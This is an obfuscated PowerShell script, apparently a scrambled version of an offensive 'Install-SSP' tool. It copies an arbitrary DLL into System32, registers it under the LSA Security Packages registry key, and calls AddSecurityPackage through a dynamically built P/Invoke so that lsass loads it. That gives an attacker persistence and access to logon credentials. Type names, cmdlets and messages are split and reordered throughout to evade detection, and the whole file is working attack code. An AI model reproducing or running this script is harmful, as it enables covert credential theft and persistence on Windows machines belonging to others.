  ${S`3cGl}=[tyPe]("{8}{2}{1}{4}{6}{3}{5}{0}{7}" -F'EnTi','I','EcURITy.PrINC','INdoWSI','pa','D','L.w','ty','s');  .('SV')  ("e"+"v5k") (  [type]("{6}{3}{0}{4}{5}{2}{1}" -f'y.priNc','Role','NdoWsbuIlTin','CURiT','IP','aL.wi','Se')  );  .("{0}{1}" -f 's','Et-itEM')  VaRIAbLe:4NEJw  ( [tyPE]("{1}{2}{0}{3}{4}"-F '.fIlEm','systEm.I','O','od','e')  )  ;    .("{1}{0}" -f '-itEm','SET') VArIaBlE:SR6Xj ([TypE]("{1}{4}{2}{0}{3}"-F 'M.Io.Fi','S','Ste','LeAcCESS','Y') );  ${M`hE`AO} =[TYPE]("{5}{7}{4}{0}{3}{6}{1}{2}"-f'e','NC','oDiNG','XT.aSCi','t','SySt','ie','EM.')  ;    .("{2}{0}{1}"-f't','EM','Set-I')  ('Va'+'rIab'+'le:K96'+'5D') (  [typE]("{4}{5}{1}{2}{6}{0}{3}" -F 'Gi','O.S','EE','N','sys','tEm.i','koRI'))  ; ${3`VCu}= [TyPE]("{1}{0}" -f 'domAin','apP')  ;   ${c`XtL`9Z}  = [tYPe]("{5}{0}{3}{6}{1}{7}{8}{4}{2}" -f 'CtiO','t','cEsS','N.E','bLybuILdeRac','rEFle','Mi','.ass','Em')  ;   ${o`5`SIg}=  [typE]("{5}{0}{6}{3}{4}{8}{2}{1}{7}" -F 'fL','N','e','CTION.C','Alling','rE','E','TIONs','CONV')  ;   .('sv')  A6qFNm  (  [tyPE]("{2}{0}{8}{1}{7}{6}{10}{4}{3}{5}{9}"-f 'M','in','rUnTI','ngcOnVE','.caLLI','nTIO','eRoPserVicE','T','E.','N','S')  )  ;  ${R`mB}  = [tYPe]("{0}{1}{3}{6}{2}{5}{4}" -f 'RUNTiMe','.intErOpSE','s','RvIc','ARseT','.Ch','E')  ;    ${7`5Y`TK}=[TYpE]("{2}{0}{1}" -F'Ntp','tr','i')  ; &("{1}{0}"-f 'ET','s')  ('ycomd'+'r') ( [tYpe]("{2}{3}{0}{6}{4}{5}{1}"-F 'e.I','L','rUN','TIM','Es.m','arSHA','ntEroPseRVIc') )  ; function ins`Ta`Ll-SSP
{


    [CmdletBinding()] Param (
        [ValidateScript({.("{1}{0}" -f 'Path','Test-') (&("{1}{2}{0}" -f 'Path','R','esolve-') ${_})})]
        [String]
        ${p`ATh}
    )

    ${P`RInci`Pal} = [Security.Principal.WindowsPrincipal]  (  .("{1}{0}" -f 'LE','varIab')  ('s3'+'cGL')  -vaLUEo)::("{2}{0}{1}" -f 'etCur','rent','G').Invoke()

    if(-not ${p`Ri`NCiPAl}.("{1}{2}{0}"-f'Role','I','sIn').Invoke(  ${Ev`5K}::"AdmInIS`T`R`Ator"))
    {
        throw ("{28}{18}{2}{23}{0}{4}{20}{9}{6}{5}{16}{21}{15}{22}{8}{7}{3}{13}{27}{26}{14}{25}{24}{11}{12}{10}{31}{19}{29}{30}{17}{1}"-f'n','ompt.','ta','nist','g a','P ','S','dmi','s a',' S','om ','s script f','r','rative','ights. Exec','equ','dll ',' pr','s',' ele','n','r','ire','lli',' thi','ute','r',' ','In','vated PowerSh','ell','an')
    }

    
    ${F`ULL`D`LlpatH} = &("{2}{1}{0}"-f 'Path','esolve-','R') ${pA`TH}

    
    function loCAL:geT`-PeA`RcHIt`ec`Ture
    {
        Param
        (
            [Parameter( positIoN = 0,
                        MANdATorY = ${t`Rue} )]
            [String]
            ${p`Ath}
        )
    
        
        ${f`ilEsTre`Am} = &("{0}{1}{2}"-f 'New-O','b','ject') ("{0}{4}{1}{2}{3}"-f'System.','St','rea','m','IO.File')(${Pa`Th},   ( &("{0}{1}"-f'iTE','M') vArIABLe:4nEjW)."VaL`UE"::"oP`en",   (  &('LS') variaBlE:sr6XJ )."v`ALUE"::"RE`AD")
    
        [Byte[]] ${Mz`heA`DeR} = &("{3}{2}{0}{1}"-f'e','ct','w-Obj','Ne') ("{1}{0}" -f ']','Byte[')(2)
        ${FI`L`EST`ReAM}.("{1}{0}" -f 'd','Rea').Invoke(${Mzhea`d`ER},0,2) | &("{1}{2}{0}" -f'll','Out-N','u')
    
        ${Hea`Der} =   ${Mh`e`AO}::"a`SCii"."g`etS`TRing"(${mzHE`Ad`er})
        if (${hE`A`dEr} -ne 'MZ')
        {
            ${FI`le`stR`EaM}.("{0}{1}" -f'Cl','ose').Invoke()
            Throw ("{2}{4}{0}{3}{1}" -f'PE h','der.','Inva','ea','lid ')
        }
    
        
        ${F`I`lEStR`EaM}.("{1}{0}"-f 'k','See').Invoke(0x3c,   (.("{0}{1}"-f 'Gc','I')  ("vAri"+"A"+"blE:"+"k9"+"65d"))."v`AlUe"::"beg`In") | .("{2}{1}{0}"-f 'Null','-','Out')
    
        [Byte[]] ${l`FA`NEw} = &("{2}{0}{1}" -f 'w-Obj','ect','Ne') ("{1}{0}" -f ']','Byte[')(4)
    
        
        ${FiL`E`StrEAM}.("{1}{0}"-f 'ad','Re').Invoke(${l`Fan`ew},0,4) | .("{1}{2}{0}" -f'ull','Out','-N')
        ${PEo`FfS`eT} = [Int] ('0x{0}' -f (( ${l`FAn`EW}[-1..-4] | &('%') { ${_}.("{2}{1}{0}"-f 'ng','i','ToStr').Invoke('X2') } ) -join ''))
    
        
        ${F`Iles`T`REAm}.("{0}{1}" -f'Se','ek').Invoke(${pE`OFfS`ET} + 4,  (&("{0}{1}{2}"-f 'V','a','riABLE')  ('k965'+'d') -VaLU  )::"b`EGiN") | &("{1}{2}{0}" -f 't-Null','O','u')
        [Byte[]] ${Im`AGe_fIl`E`_m`AcHINe} = .("{1}{2}{0}"-f '-Object','Ne','w') ("{0}{1}"-f 'Byte','[]')(2)
    
        
        ${fIl`ES`T`ReAM}.("{0}{1}"-f 'Rea','d').Invoke(${imAgE_Fil`E`_MaCHi`Ne},0,2) | .("{1}{2}{0}" -f'll','Out','-Nu')
        ${a`R`ChitEcTu`RE} = '{0}' -f (( ${i`mAgE`_F`ilE_m`Achi`Ne}[-1..-2] | .('%') { ${_}.("{0}{1}" -f'To','String').Invoke('X2') } ) -join '')
        ${file`sT`R`eAM}.("{0}{1}" -f 'C','lose').Invoke()
    
        if ((${a`R`CHitE`CtU`RE} -ne ("{0}{1}"-f '014','C')) -and (${Ar`CHITe`C`TU`RE} -ne ("{1}{0}" -f'664','8')))
        {
            Throw ("{0}{6}{10}{5}{9}{7}{4}{2}{1}{8}{3}" -f'I','tect','rted archi','e.','o','id P','nva','header or unsupp','ur','E ','l')
        }
    
        if (${Ar`Chit`Ec`TuRE} -eq ("{1}{0}" -f'C','014'))
        {
            &("{0}{3}{2}{1}" -f'Wr','put','te-Out','i') ("{0}{1}"-f'3','2-bit')
        }
        elseif (${ArC`HiTE`ct`URE} -eq ("{0}{1}" -f'866','4'))
        {
            .("{1}{0}{2}"-f'Outpu','Write-','t') ("{1}{0}"-f'4-bit','6')
        }
        else
        {
            &("{0}{1}{2}" -f 'Wr','ite-Out','put') ("{1}{0}" -f 'her','Ot')
        }
    }

    ${dlla`RcHitECT`U`RE} = .("{0}{1}{4}{3}{2}{5}" -f'G','et-PE','ec','hit','Arc','ture') ${f`Ulld`LLPATH}

    ${os`A`RCH} = &("{2}{0}{1}{3}" -f '-Wm','iObje','Get','ct') ("{6}{3}{2}{1}{0}{5}{4}"-f'r','e','_Op','32','em','atingSyst','Win') | &("{3}{1}{2}{0}" -f 't','l','ect-Objec','Se') -ExpandProperty ("{1}{3}{2}{4}{0}"-f'ture','OSAr','ite','ch','c')

    if (${dlla`R`C`Hitectu`Re} -ne ${Os`AR`Ch})
    {
        throw ("{11}{7}{5}{0}{6}{12}{8}{13}{9}{3}{4}{14}{10}{2}{1}"-f'g syste','SP dll.','e S','he a','rchitecture ','atin','m arc','e oper','ec','atch t','f th','Th','hit','ture must m','o')
    }

    ${D`ll} = .("{0}{1}{2}"-f'G','et-','Item') ${F`U`lldl`lpaTh} | &("{1}{3}{0}{2}" -f 't-O','Sel','bject','ec') -ExpandProperty ("{1}{0}" -f'e','Nam')

    
    
    ${dLL`NA`ME} = ${D`lL} | .('%') { .('%') {(${_} -split '\.')[0]} }

    
    ${seCu`Rit`yP`ACkAg`Es} = &("{1}{3}{0}{4}{2}" -f'tem','Get-','roperty','I','P') (("{0}{1}{7}{5}{6}{8}{2}{3}{4}{9}"-f 'HK','LM:0FCSYSTE','Con','t','rol0FCL','CCu','rrentControlS','M0F','et0FC','sa')).("{0}{1}{2}"-f'RE','PL','acE').Invoke('0FC','\') -Name ("{0}{3}{1}{5}{4}{2}" -f 'Security','a','es',' P','g','cka') |
        .("{3}{0}{1}{2}" -f 'j','e','ct','Select-Ob') -ExpandProperty ("{0}{3}{1}{2}{4}" -f'S','ur','ity Pack','ec','ages')

    if (${Se`c`UriTyP`A`CKagEs} -contains ${DLln`AME})
    {
        throw ("'$DllName' "+'is'+' '+'al'+'ready'+' '+'presen'+'t'+' '+'in'+' '+('H'+'K'+'LM:{0}SY'+'STEM{0}CurrentCon'+'trolSe'+'t{0}'+'Co'+'ntrol{'+'0}Ls'+'a'+'{0'+'}S'+'ecu'+'rit'+'y ')-F [CHar]92+'Pa'+'c'+'kages.')
    }

    
    ${N`ATivEi`NSta`llD`iR} = "$($Env:windir)\Sysnative"

    if (.("{3}{0}{1}{2}" -f 't-Pa','t','h','Tes') ${nAt`ivEI`NSt`AL`ldir})
    {
        ${In`STAL`LDiR} = ${nATivEinST`ALl`D`iR}
    }
    else
    {
        ${In`stALlD`ir} = "$($Env:windir)\System32"
    }

    if (&("{2}{0}{3}{1}"-f'es','ath','T','t-P') (.("{1}{2}{0}" -f'h','Join-Pa','t') ${i`NSt`AlLdir} ${D`lL}))
    {
        throw ("$Dll "+'i'+'s '+'alread'+'y'+' '+'inst'+'al'+'led '+'i'+'n '+"$InstallDir.")
    }

    
    &("{2}{1}{0}" -f'm','Ite','Copy-') ${fuLLD`LLP`AtH} ${iNSt`All`DiR}

    ${SE`c`U`R`i`TYpackages} += ${DLL`N`AMe}

    .("{4}{3}{0}{2}{1}" -f'r','rty','ope','P','Set-Item') ((("{0}{4}{2}{5}{8}{1}{3}{6}{7}" -f 'HKLM:{0}SYSTEM{0}C','ControlS','rr','et{0}Con','u','en','tro','l{0}Lsa','t')) -F  [cHAR]92) -Name ("{4}{3}{0}{2}{1}"-f' ','ages','Pack','y','Securit') -Value ${S`ec`UrIt`ypaCK`AG`eS}

    ${Dy`N`ASsEMBly} = .("{2}{0}{1}"-f'b','ject','New-O') ("{3}{2}{0}{5}{1}{6}{4}"-f'c','s','fle','System.Re','lyName','tion.A','semb')(("{1}{0}" -f 'PI2','SS'))
    ${ASSE`mBlyB`UiLD`eR} =   (  &("{2}{0}{1}{3}" -f 'et-VARi','aBl','g','E')  3vcU -vALuEo  )::"C`UrReN`TdOmAin".("{6}{5}{0}{1}{2}{3}{4}" -f 'eDynamicAs','s','e','m','bly','efin','D').Invoke(${dy`NaS`s`EmBlY},   (&('Ls') ("v"+"A"+"ri"+"aBLE:CXTl9Z") )."Va`LUe"::"r`Un")
    ${mO`dUl`EBU`IlD`eR} = ${A`sse`mbly`B`UIl`der}.("{4}{0}{6}{2}{3}{5}{1}"-f 'e','e','Mo','d','Defin','ul','Dynamic').Invoke(("{0}{1}"-f'SSPI','2'), ${Fa`lsE})

    ${T`y`P`EBUIldER} = ${M`oDu`LE`BuILder}.("{1}{0}{2}" -f'fineTyp','De','e').Invoke(("{1}{2}{0}" -f'2','SSPI2.S','ecur3'), ("{0}{2}{1}{3}" -f 'P','ic, C','ubl','lass'))
    ${Pi`Nv`O`KEMETH`od} = ${tYp`ebu`i`lDER}.("{0}{3}{2}{1}{4}"-f 'Defin','ok','nv','ePI','eMethod').Invoke(("{1}{5}{3}{4}{0}{2}" -f 'Pack','A','age','d','Security','d'),
        ("{2}{3}{0}{1}" -f'3','2.dll','s','ecur'),
        ("{2}{3}{0}{1}"-f 'blic, St','atic','P','u'),
          (  .("{2}{3}{0}{1}"-f 'Ri','ABlE','Get-V','A') ("o5S"+"IG") )."V`ALUE"::"S`TAnDArd",
        [Int32],
        [Type[]] @([String], [IntPtr]),
         ( &("{1}{2}{0}"-f'RIAbLe','GEt-v','A') a6QFnM -va  )::"W`I`NaPI",
         ${R`mB}::"aU`TO")

    ${SEC`U`R32} = ${TY`PeBui`LD`Er}.("{2}{1}{0}{3}"-f 'at','e','Cr','eType').Invoke()

    if (  (.("{0}{2}{1}" -f 'V','RIabLe','A') 75YTk)."VaL`Ue"::"S`izE" -eq 4) {
        ${sT`RUct`SI`ZE} = 20
    } else {
        ${sTR`UCTsI`zE} = 24
    }

    ${STR`U`CTPtr} =   ${Yc`OM`dR}::("{1}{2}{0}"-f'l','AllocHGl','oba').Invoke(${s`TRUCTs`IZe})
      ${ycO`mDr}::("{0}{2}{1}" -f'Write','nt32','I').Invoke(${StruC`Tp`TR}, ${StrU`cts`iZE})

    ${Ru`NtIM`e`SU`CcesS} = ${tR`Ue}

    try {
        ${REs`U`Lt} = ${sEC`UR32}::("{0}{1}{3}{2}"-f'AddS','ec','ityPackage','ur').Invoke(${Dll`Na`mE}, ${sT`RUc`TPtr})
    } catch {
        ${HR`E`SUlt} = ${E`RROR}[0]."eXce`p`Ti`On"."inN`er`eX`ce`pTioN"."h`Re`SulT"
        &("{1}{3}{2}{0}" -f'ning','Wri','r','te-Wa') "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8'))) "
        .("{0}{1}{2}" -f 'Wri','t','e-Warning') "Reason: $(([ComponentModel.Win32Exception] $HResult).Message) "
        ${rUNtIM`e`SUC`CEss} = ${fa`l`Se}
    }

    if (${RuntiMES`UcCe`SS}) {
        .("{1}{3}{2}{0}"-f'e','W','e-Verbos','rit') ("{5}{3}{0}{6}{7}{9}{4}{2}{10}{8}{1}" -f 'io','complete!','din','nstallat','oa','I','n ','and ',' ','l','g')
    } else {
        .("{0}{2}{3}{1}"-f'Wri','rbose','te-','Ve') ("{2}{13}{14}{12}{10}{15}{16}{0}{8}{7}{4}{9}{11}{6}{5}{3}{1}"-f'cha','.','Instal','t','a','c','ffe','s to t','nge','ke','n co',' e','o','lat','i','mplete','! Reboot for ')
    }
}